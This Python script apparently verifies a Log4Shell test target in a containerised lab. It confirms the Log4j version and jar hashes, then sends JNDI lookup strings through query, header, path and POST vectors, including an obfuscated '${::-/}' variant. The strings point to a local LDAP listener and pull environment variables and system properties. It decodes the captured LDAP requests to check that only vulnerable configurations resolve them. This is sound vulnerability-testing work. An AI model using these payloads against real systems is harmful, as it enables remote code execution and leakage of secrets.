"""Verify genuine vendor lookups independently of Framework's scanner."""
import base64
import json
import os
from pathlib import Path
import subprocess
import urllib.parse
import urllib.request


class NativeTarget:
    def __init__(self, runtime):
        self.runtime = runtime
        endpoint = runtime['endpoints']['target']
        self.base = 'http://{}:{}'.format(endpoint['host'], endpoint['port'])
        self.requests = []
        self.commands = []

    def request(self, path, method='GET', headers=None):
        request = urllib.request.Request(self.base + path, method=method, headers=headers or {})
        with urllib.request.urlopen(request, timeout=12) as response:
            raw = response.read()
            result = json.loads(raw)
            self.requests.append(dict(path=path, method=method, headers=headers or {}, status=response.status, response=result))
            assert response.status == 200
            return result

    def command(self, *arguments):
        command = self.runtime['compose'] + ['exec', '-T', 'target'] + list(arguments)
        result = subprocess.run(command, capture_output=True, text=True, timeout=20)
        receipt = dict(argv=command, exitstatus=result.returncode, stdout=result.stdout, stderr=result.stderr)
        self.commands.append(receipt)
        assert result.returncode == 0, receipt
        return result.stdout


def ber(data):
    """Decode definite BER lengths independently of the Java collector."""
    assert len(data) >= 2
    tag, size, offset = data[0], data[1], 2
    if size & 128:
        count = size & 127
        assert 0 < count <= 3 and len(data) >= 2 + count
        size = int.from_bytes(data[offset:offset + count], 'big')
        offset += count
    assert offset + size <= len(data)
    return tag, data[offset:offset + size], data[offset + size:]


def ldap_search(event, expected):
    tag, message, rest = ber(base64.b64decode(event['request_base64'], validate=True))
    assert tag == 48 and rest == b''
    tag, identifier, message = ber(message)
    assert tag == 2 and identifier
    tag, request, rest = ber(message)
    assert tag == 99
    tag, base_dn, rest = ber(request)
    assert tag == 4 and base_dn.decode() == expected == event['base_dn']
    tag, response, rest = ber(base64.b64decode(event['response_base64'], validate=True))
    assert tag == 48 and rest == b''
    tag, response_identifier, response = ber(response)
    assert tag == 2 and response_identifier == identifier
    tag, result, rest = ber(response)
    assert tag == 101 and rest == b'' and result == bytes.fromhex('0a010004000400')


def prove(runtime):
    client = NativeTarget(runtime)
    artifact = Path(runtime['artifacts'])
    proof = {}
    try:
        meta = client.request('/meta')
        catalog = json.loads(Path(__file__).with_name('vendor.json').read_text())['artifacts']
        version = os.environ.get('LOG4SHELL_VERSION', '2.14.1')
        mode = os.environ.get('LOG4SHELL_MODE', 'log4j')
        assert meta['version'] == meta['implementation_version'] == version
        assert meta['mode'] == mode
        assert meta['java_version'].startswith('1.8.')
        assert meta['trust_url_codebase'] == 'false'
        assert meta['format_msg_no_lookups'] == ('true' if mode == 'disabled' else None)
        expected_logger = 'java.util.logging.Logger' if mode == 'jul' else 'org.apache.logging.log4j.core.Logger'
        assert meta['logger_class'] == expected_logger
        for component in ['api', 'core']:
            filename = 'log4j-{}-{}.jar'.format(component, version)
            row = next(row for row in catalog if row['file'] == filename)
            assert meta['jars'][filename] == row['sha256']
            assert meta[component + '_code_source'] == 'file:/opt/module-target/vendor/' + filename
        java = client.command('java', '-version')
        hashes = client.command('sha256sum', *['vendor/' + name for name in meta['jars']])
        assert all('{}  vendor/{}'.format(value, name) in hashes for name, value in meta['jars'].items())
        expected = 'cn=native/{}/{}/{}^{}'.format(meta['java_os_lookup'], meta['java_vendor'] + '_' + meta['java_version'], meta['sentinel'], meta['property_sentinel'])
        resource = 'cn=native/${java:os}/${sys:java.vendor}_${sys:java.version}/${env:MSF_MODULE_TARGET_LEAK}^${sys:msf.module.target.value}'
        expression = '${jndi:ldap://127.0.0.1:8389/' + resource + '}'
        cases = [
            ('native', '/native-log?value=' + urllib.parse.quote(expression, safe=''), 'GET', {}),
            ('header', '/header/', 'GET', {'X-Log4j-Input': expression}),
            ('path', '/path/' + urllib.parse.quote(expression.replace('ldap://', 'ldap:${::-/}/'), safe='') + '/', 'GET', {}),
            ('query', '/query/?q=' + urllib.parse.quote(expression, safe=''), 'POST', {}),
            ('unlogged', '/unlogged/', 'GET', {'X-Log4j-Input': expression}),
        ]
        controls = []
        for label, path, method, headers in cases:
            before = client.request('/events')['sequence']
            client.request(path, method=method, headers=headers)
            events = client.request('/events?after=' + str(before))['events']
            assert not any(row['kind'] in ['http_error', 'collector_error'] for row in events), events
            searches = [row for row in events if row['kind'] == 'native_ldap' and row['operation'] == 99]
            vulnerable = version == '2.14.1' and mode == 'log4j' and label != 'unlogged'
            # Log4j may retry unresolved substitutions after the empty LDAP result.
            assert bool(searches) == vulnerable, (label, meta, events)
            for event in searches:
                ldap_search(event, expected)
            controls.append(dict(label=label, expected_lookup=vulnerable, events=events))
        memory = client.command('cat', '/sys/fs/cgroup/memory.events')
        assert 'oom 0\n' in memory and 'oom_kill 0\n' in memory
        pids = client.command('cat', '/sys/fs/cgroup/pids.events')
        assert pids.strip() == 'max 0'
        proof = dict(metadata=meta, controls=controls, memory_events=memory, pids_events=pids)
        return proof
    finally:
        receipt = dict(proof=proof, requests=client.requests, commands=client.commands)
        (artifact / 'native-log4shell.json').write_text(json.dumps(receipt, indent=2) + '\n')


if __name__ == '__main__':
    runtime = json.loads(Path(os.environ['MODULE_TARGET_RUNTIME']).read_text())
    print(json.dumps(prove(runtime)))
